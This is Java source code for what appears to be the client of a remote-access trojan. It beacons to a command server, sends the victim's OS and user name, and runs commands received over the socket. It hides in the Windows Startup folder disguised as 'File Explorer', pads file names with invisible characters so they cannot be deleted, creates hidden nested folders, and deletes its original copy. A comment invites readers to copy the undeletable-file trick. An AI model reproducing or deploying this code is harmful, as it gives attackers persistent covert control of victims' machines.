package me.sebsb;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.DosFileAttributes;
import java.util.ArrayList;

import javax.swing.FocusManager;

import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;

public class Client {

	public static final int PORT = 5554;
	public static final long RETRY = 5000;
	public static final String IP = "127.0.0.1";
	public static final StartupMode startup = StartupMode.NORMAL;
	
	private static ClientManager manager;
	
	public void run() {
		try {
			Socket s = null;
			while (s == null) {
				try {
					s = new Socket(IP, PORT);
				} catch (Exception e) {}
				Thread.sleep(RETRY);
			}
			PrintWriter pw = new PrintWriter(s.getOutputStream(), true);
			this.sendInfo(pw, s);
			BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
			boolean dead = false;
			while (!dead) {
				try {
					String line = br.readLine();
					if (line == null) {
						dead = true;
						throw new Exception();
					}
					
					try {
						manager.onMessage(line, pw);
					} catch (Exception e) {
						e.printStackTrace();
					}
				} catch (SocketException e2) {
					this.run();
					return;
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			s.close();
			s.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		this.run();
	}
	
	private void sendInfo(PrintWriter pw, Socket s) {
		ArrayList<String> info = new ArrayList<String>();
		info.add("OS:" + System.getProperty("os.name"));
		info.add("USER:" + System.getProperty("user.name"));
		NetUtils.sendMessage(info, MessageType.INFO, pw);
	}
	
	public Client() {
		this.run();
	}
	
	public static void main(String[] args) {
		if (args.length > 0) {
			try {
				Thread.sleep(8000);
			} catch (InterruptedException e1) {
				e1.printStackTrace();
			}
			try {
				new File(args[0]).delete();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		try {
			startup();
		} catch (Exception e) {
			e.printStackTrace();
		}
		manager = new ClientManager();
		new Client();
	}
	
	/*
	 * Folder and Blatant startup modes have not been tested. I think they would though.
	 * 
	 * BTW this creates undeletable files. I accidently came across this bug with windows which prevents files from being deleted.
	 * If you wanna use this 'exploit' in your own programs make sure u copy and paste the code, typing it again will cause it to not work.
	 * Don't tell Microsoft lol.
	 */
	private static void startup() throws URISyntaxException, IOException {
		File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
			    .toURI());
		String fileName = "File Explorer";
		String e = ".jar";
		File startupLoc = new File(System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
		if (!jar.exists() || jar.getName().contains(fileName) || !startupLoc.exists()) {
			return;
		}
		if (startup.equals(StartupMode.NORMAL)) {
			boolean created = false;
			for (int l = 0; l < 15; l++) {
				if (!created) {
					try {
						// If you're wondering why I'm using this string builder, its because this makes files undeletable in windows.
						StringBuilder sb = new StringBuilder(fileName);
						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
							sb.append("‎");
						}
						sb.append(e);
						File file = null;
						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(startupLoc, sb.toString())));
						created = true;
						file.setWritable(false);
					} catch (Exception eee) {}
				}
			}
		} else if (startup.equals(StartupMode.FOLDER)) {
			File lastFolder = startupLoc;
			boolean created1 = false;
			for (int l = 0; l < 15; l++) {
				if (!created1) {
					try {
						StringBuilder sb = new StringBuilder("folder");
						for (int k = 0; k < 259 - l - "folder".length(); k++) {
							sb.append("‎");
						}
						lastFolder = new File(lastFolder, sb.toString());
						if (!lastFolder.exists()) {
							lastFolder.mkdir();
							setHiddenAttrib(Paths.get(lastFolder.getPath()));
							created1 = true;
						}
					} catch (Exception e2) {}
				}
			}
			boolean created = false;
			for (int l = 0; l < 15; l++) {
				if (!created) {
					try {
						StringBuilder sb = new StringBuilder(fileName);
						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
							sb.append("‎");
						}
						sb.append(e);
						File file = null;
						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(lastFolder, sb.toString())));
						created = true;
						file.setWritable(false);
					} catch (Exception eee) {}
				}
			}
		} else if (startup.equals(StartupMode.BLATANT)) {
			File lastFolder = startupLoc;
			for (int i = 0; i < 4000; i++) {
				boolean created = false;
				for (int l = 0; l < 15; l++) {
					if (!created) {
						try {
							StringBuilder sb = new StringBuilder("folder");
							for (int k = 0; k < 259 - l - "folder".length(); k++) {
								sb.append("‎");
							}
							lastFolder = new File(lastFolder, sb.toString());
							if (!lastFolder.exists()) {
								lastFolder.mkdir();
								setHiddenAttrib(Paths.get(lastFolder.getPath()));
								created = true;
							}
						} catch (Exception e2) {}
					}
				}
			}
			
			String characters = "abcdefghijklmnopqrstuvwxyz123456789";
			for (int k = 0; k < characters.length() * 12; k++) {
				boolean created = false;
				for (int l = 0; l < 15; l++) {
					if (!created) {
						try {
							StringBuilder sb = new StringBuilder(characters.charAt(k % characters.length()));
							for (int i = 0; i < 257 - l; i++) {
								sb.append("‎");
							}
							File file = new File(lastFolder, sb.toString());
							file.createNewFile();
							created = true;
							file.setWritable(false);
						} catch (Exception eee) {}
					}
				}
			}
			boolean created = false;
			for (int l = 0; l < 15; l++) {
				if (!created) {
					try {
						StringBuilder sb = new StringBuilder(fileName);
						for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
							sb.append("‎");
						}
						sb.append(e);
						File file = null;
						Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(lastFolder, sb.toString())));
						created = true;
						file.setWritable(false);
					} catch (Exception eee) {}
				}
			}
		}
	}
	
	private static void setHiddenAttrib(Path filePath) {		
		try {
			DosFileAttributes attr = Files.readAttributes(filePath, DosFileAttributes.class);
			Files.setAttribute(filePath, "dos:hidden", true);
			attr = Files.readAttributes(filePath, DosFileAttributes.class);
		} catch (IOException e) {} 
	}

}

enum StartupMode {
	NONE,
	NORMAL,
	FOLDER,
	BLATANT
}
